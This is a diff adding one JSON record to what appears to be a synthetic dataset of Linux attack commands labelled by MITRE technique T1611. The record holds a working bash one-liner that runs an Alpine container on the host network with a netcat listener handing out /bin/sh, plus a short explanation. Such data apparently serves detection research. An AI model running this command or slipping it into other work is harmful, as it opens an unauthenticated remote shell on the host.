@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-1356d1fb-cfbe9379",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "docker run --rm --net host -it alpine nc -lvp 4444 -e /bin/sh",
+  "explanation": "Starts a netcat listener inside the container with host network, effectively making it listen directly on the host's network interfaces.",
+  "rationale_steps": [
+    "Create a container sharing the host's networking stack.",
+    "Setup a reverse shell to listen for incoming connections directly on the host's network."
+  ],
+  "source_prompt_hash": "1356d1fb",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:27:59.937327Z"
+}
